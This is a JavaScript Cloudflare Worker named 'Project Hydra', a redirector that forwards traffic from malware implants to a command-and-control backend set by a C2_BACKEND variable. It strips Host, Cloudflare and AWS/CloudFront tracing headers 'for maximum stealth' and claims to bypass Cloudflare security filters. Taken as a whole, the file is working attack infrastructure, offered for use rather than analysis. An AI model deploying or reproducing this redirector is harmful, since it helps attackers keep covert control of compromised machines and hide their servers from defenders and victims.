/**
 * Project Hydra: Clean Edge Redirector (Cloudflare Worker)
 * Safely forwards traffic to CloudFront while bypassing Cloudflare 1016 security filters.
 */
export default {
  async fetch(request, env) {
    const originalUrl = new URL(request.url);
    const targetUrl = new URL(env.C2_BACKEND);

    // Copy the path and query parameters to the AWS destination
    targetUrl.pathname = originalUrl.pathname;
    targetUrl.search = originalUrl.search;

    // Create a new Headers object to sanitize the request
    const proxyHeaders = new Headers();

    // Copy all safe headers from the implant, strictly dropping the Host and Cloudflare trace headers
    for (const [key, value] of request.headers.entries()) {
      const lowerKey = key.toLowerCase();
      if (lowerKey !== 'host' && !lowerKey.startsWith('cf-') && lowerKey !== 'x-forwarded-proto') {
        proxyHeaders.set(key, value);
      }
    }

    // Build the clean request
    const proxyRequest = new Request(targetUrl.toString(), {
      method: request.method,
      headers: proxyHeaders,
      // Only attach body if it's a POST/PUT request
      body: (request.method !== 'GET' && request.method !== 'HEAD') ? request.body : null,
      redirect: 'manual'
    });

    try {
      const response = await fetch(proxyRequest);

      const newResponseHeaders = new Headers(response.headers);
      // Scrub AWS and CloudFront tracing headers for maximum stealth
      newResponseHeaders.delete("Server");
      newResponseHeaders.delete("X-Cache");
      newResponseHeaders.delete("Via");
      newResponseHeaders.delete("X-Amz-Cf-Pop");
      newResponseHeaders.delete("X-Amz-Cf-Id");

      return new Response(response.body, {
        status: response.status,
        statusText: response.statusText,
        headers: newResponseHeaders
      });
    } catch (e) {
      return new Response("Backend Offline", { status: 502 });
    }
  }
};